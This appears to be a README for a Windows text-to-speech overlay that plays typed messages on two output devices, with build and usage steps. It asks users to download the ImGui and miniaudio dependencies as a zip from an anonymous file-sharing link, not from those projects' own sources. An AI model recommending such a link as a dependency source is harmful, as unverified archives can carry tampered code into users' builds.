# VOICECHAT TTS

A lightweight Windows overlay that lets you type a short message and play it over two output devices at once. It is designed for games/voice chat where you need TTS quickly without disturbing the mic.

## Features
- Windows SAPI text-to-speech playback (offline).
- Optional keyless online TTS backup (toggle in the config window).
- Dual output device playback via miniaudio/WASAPI.
- Global hotkeys for quick start/stop.

## Requirements
- Windows 10/11.
- Visual Studio 2022 (or newer) with the Desktop C++ workload.
- CMake 3.20+.
- `extern/` dependencies (ImGui + miniaudio) downloaded from the provided zip.

## Getting the extern dependencies
The `extern` folder is distributed as a zip that already contains the `extern/` directory and its subfolders.

1. Download the zip: <https://filebin.net/m4gipplj7btweg6c/extern.zip>
2. Extract it at the repository root. You should end up with:

```
extern/
  imgui/
  miniaudio/
```

The repository ignores `extern/` and `build/` by default.

## Build (Windows)
```
cmake -S . -B build -G Ninja -DCMAKE_BUILD_TYPE=Release -DCMAKE_CXX_COMPILER=clang++
cmake --build build
```

## Usage
1. Launch the app and select two output devices.
2. (Optional) Click **Keyless backup** to enable the online fallback.
3. Click **Start** to enable hotkeys.
4. Use the hotkeys to start/stop recording:
   - Toggle: **Ctrl + Backspace**
   - Stop: **Enter**
   - Exit: **Ctrl + Shift + Tab + E**

When you stop recording, the typed text is converted to speech and played to the chosen devices.

## Keyless backup TTS
The optional keyless backup uses the StreamElements public TTS endpoint (no API key required). It is intended as a fallback when the local SAPI voice is not desired. Because it is online, it requires an active internet connection.
